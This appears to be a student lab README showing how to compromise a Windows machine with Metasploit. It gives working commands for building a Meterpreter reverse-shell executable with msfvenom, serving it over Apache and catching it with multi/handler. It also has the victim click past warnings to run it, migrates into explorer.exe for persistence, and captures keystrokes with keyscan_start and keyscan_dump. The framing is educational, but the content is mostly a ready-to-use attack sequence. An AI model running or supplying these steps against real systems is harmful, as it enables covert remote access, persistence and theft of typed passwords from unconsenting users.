# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig

## OUTPUT:
![ifconfig](https://github.com/Sanjay-2610/Compromising-windows-using-Metasploit/assets/91368803/618f13c5-561c-4994-a1a9-fa46d30c9af6)

Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:

![msfvenom](https://github.com/Sanjay-2610/Compromising-windows-using-Metasploit/assets/91368803/1b161916-295d-415b-a0f0-b4310c136c79)

copy the fun.exe into the apache /var/www/html folder
## OUTPUT:
![fun.exe](https://github.com/Sanjay-2610/Compromising-windows-using-Metasploit/assets/91368803/c82ce3a5-3727-497c-8015-0f5d9d3e25e5)

Start apache server
sudo systemctl apache2 start
## OUTPUT:
![apache2](https://github.com/Sanjay-2610/Compromising-windows-using-Metasploit/assets/91368803/05e9c144-63c6-4347-b877-af4c918074ef)

Check the status of apache2
## OUTPUT:
![apache2](https://github.com/Sanjay-2610/Compromising-windows-using-Metasploit/assets/91368803/03634e13-6079-40f4-aeb3-97c12c61f982)

Invoke msfconsole:
## OUTPUT:
![msfconsole](https://github.com/Sanjay-2610/Compromising-windows-using-Metasploit/assets/91368803/76217e81-2cd9-47fd-aa92-b5e0d8d8817e)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
![?](https://github.com/Sanjay-2610/Compromising-windows-using-Metasploit/assets/91368803/1986dd9b-f850-46c1-813f-2ed95fbb3d15)

Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit
![css](https://github.com/Sanjay-2610/Compromising-windows-using-Metasploit/assets/91368803/9582831a-d636-4952-8d66-40e44e14e143)


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 

![277979854-03f20cd0-6941-4198-8b64-51b4d0aa0acb](https://github.com/Sanjay-2610/Compromising-windows-using-Metasploit/assets/91368803/8f99e0a7-112b-4fa3-8990-d63caf99a0d9)

Bypass any warning boxes, double-click the file, and allow it to run.
![277979954-f45f4b1c-c833-40a0-96a8-0ee7dbab4be5](https://github.com/Sanjay-2610/Compromising-windows-using-Metasploit/assets/91368803/34c71ba3-9b19-4bdf-98f9-63d09cafa808)


On kali give the command exploit
![277980045-76f43c4b-aaac-41a9-96d3-6682a3433c1b](https://github.com/Sanjay-2610/Compromising-windows-using-Metasploit/assets/91368803/3952e92f-82ab-4231-8b78-96a00c674df7)


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

![image](https://github.com/Reebak04/Compromising-windows-using-Metasploit/assets/118364993/518c3556-f762-4bd8-8ac5-816ca6a3639e)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:
migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

![277980111-518c3556-f762-4bd8-8ac5-816ca6a3639e](https://github.com/Sanjay-2610/Compromising-windows-using-Metasploit/assets/91368803/544bd92f-7206-478e-9736-bf23746fd761)


Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![277980321-c5024173-f975-4900-8389-bbcb207baf2f](https://github.com/Sanjay-2610/Compromising-windows-using-Metasploit/assets/91368803/6be7f31e-aa4b-44be-8d25-fa9d7d5d6570)
![277980420-157a8792-65bf-4528-965e-c3cd0005e9f9](https://github.com/Sanjay-2610/Compromising-windows-using-Metasploit/assets/91368803/2d989242-f11f-4c2b-addf-25e6a6904d7a)



keyscan_dump	Shows the keystrokes captured so far
![277980515-82a9c840-cf1c-42f0-b009-5465612381af](https://github.com/Sanjay-2610/Compromising-windows-using-Metasploit/assets/91368803/12de7d39-aa6a-4fe8-bca9-75e4c1f11f02)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
